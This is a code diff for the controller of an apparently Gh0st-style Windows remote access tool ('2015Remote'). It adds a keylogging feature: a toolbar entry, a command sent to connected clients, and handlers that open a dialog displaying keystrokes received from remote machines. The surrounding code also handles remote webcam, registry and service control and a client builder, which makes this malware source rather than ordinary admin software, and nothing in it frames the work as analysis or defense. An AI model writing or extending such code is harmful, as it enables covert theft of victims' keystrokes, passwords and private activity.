@@ -19,6 +19,7 @@
 #include "ServicesDlg.h"
 #include "VideoDlg.h"
 #include <vector>
+#include "KeyBoardDlg.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -165,6 +166,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_COMMAND(IDM_ONLINE_VIDEO, &CMy2015RemoteDlg::OnOnlineVideoManager)
 	ON_COMMAND(IDM_ONLINE_SERVER, &CMy2015RemoteDlg::OnOnlineServerManager)
 	ON_COMMAND(IDM_ONLINE_REGISTER, &CMy2015RemoteDlg::OnOnlineRegisterManager)  
+	ON_COMMAND(IDM_KEYBOARD, &CMy2015RemoteDlg::OnOnlineKeyboardManager)
 	ON_COMMAND(IDM_ONLINE_BUILD, &CMy2015RemoteDlg::OnOnlineBuildClient)    //生成Client
 	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT (__thiscall CWnd::* )(WPARAM,LPARAM))OnIconNotify) 
 	ON_COMMAND(IDM_NOTIFY_SHOW, &CMy2015RemoteDlg::OnNotifyShow)
@@ -183,6 +185,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_OPENREGISTERDIALOG, OnOpenRegisterDialog)
 	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenVideoDialog)
 	ON_MESSAGE(WM_HANDLEMESSAGE, OnHandleMessage)
+	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyboardDialog)
 	ON_WM_HELPINFO()
 END_MESSAGE_MAP()
 
@@ -286,9 +289,10 @@ VOID CMy2015RemoteDlg::CreateToolBar()
 	m_ToolBar.SetButtonText(6,"视频管理"); 
 	m_ToolBar.SetButtonText(7,"服务管理"); 
 	m_ToolBar.SetButtonText(8,"注册表管理"); 
-	m_ToolBar.SetButtonText(9,"参数设置"); 
-	m_ToolBar.SetButtonText(10,"生成服务端"); 
-	m_ToolBar.SetButtonText(11,"帮助"); 
+	m_ToolBar.SetButtonText(9, "键盘记录");
+	m_ToolBar.SetButtonText(10,"参数设置"); 
+	m_ToolBar.SetButtonText(11,"生成服务端"); 
+	m_ToolBar.SetButtonText(12,"帮助"); 
 	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //显示
 }
 
@@ -806,6 +810,12 @@ VOID CMy2015RemoteDlg::OnOnlineRegisterManager()
 	SendSelectedCommand(&bToken, sizeof(BYTE));
 }
 
+VOID CMy2015RemoteDlg::OnOnlineKeyboardManager()
+{
+	BYTE	bToken = COMMAND_KEYBOARD;
+	SendSelectedCommand(&bToken, sizeof(BYTE));
+}
+
 void CMy2015RemoteDlg::OnOnlineBuildClient()
 {
 	// TODO: 在此添加命令处理程序代码
@@ -967,6 +977,12 @@ VOID CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
 		Dlg->OnReceiveComplete();
 		break;
 	}
+	case KEYBOARD_DLG:
+	{
+		CKeyBoardDlg* Dlg = (CKeyBoardDlg*)ContextObject->hDlg;
+		Dlg->OnReceiveComplete();
+		break;
+	}
 	default:
 		g_2015RemoteDlg->PostMessage(WM_HANDLEMESSAGE, (WPARAM)ContextObject, (LPARAM)ContextObject);
 	}
@@ -1008,6 +1024,10 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
 			CancelIo((HANDLE)ContextObject->sClientSocket);
 			closesocket(ContextObject->sClientSocket); 
 			Sleep(10);
+			break;
+		}
+	case TOKEN_KEYBOARD_START: {// 键盘记录
+			g_2015RemoteDlg->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)ContextObject);
 			break;
 		}
 	case TOKEN_LOGIN: // 上线包  shine
@@ -1202,6 +1222,12 @@ LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
 				delete Dlg; //特殊处理
 				break;
 			}
+		case KEYBOARD_DLG:
+			{
+				CKeyBoardDlg* Dlg = (CKeyBoardDlg*)p->hDlg;
+				delete Dlg;
+				break;
+			}
 		default:break;
 		}
 		delete p;
@@ -1372,6 +1398,20 @@ LRESULT CMy2015RemoteDlg::OnOpenVideoDialog(WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
+LRESULT CMy2015RemoteDlg::OnOpenKeyboardDialog(WPARAM wParam, LPARAM lParam)
+{
+	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
+
+	CKeyBoardDlg* Dlg = new CKeyBoardDlg(this, m_iocpServer, ContextObject);
+	// 设置父窗口为卓面
+	Dlg->Create(IDD_DLG_KEYBOARD, GetDesktopWindow());    //创建非阻塞的Dlg
+	Dlg->ShowWindow(SW_SHOW);
+
+	ContextObject->v1 = KEYBOARD_DLG;
+	ContextObject->hDlg = Dlg;
+
+	return 0;
+}
 
 BOOL CMy2015RemoteDlg::OnHelpInfo(HELPINFO* pHelpInfo)
 {
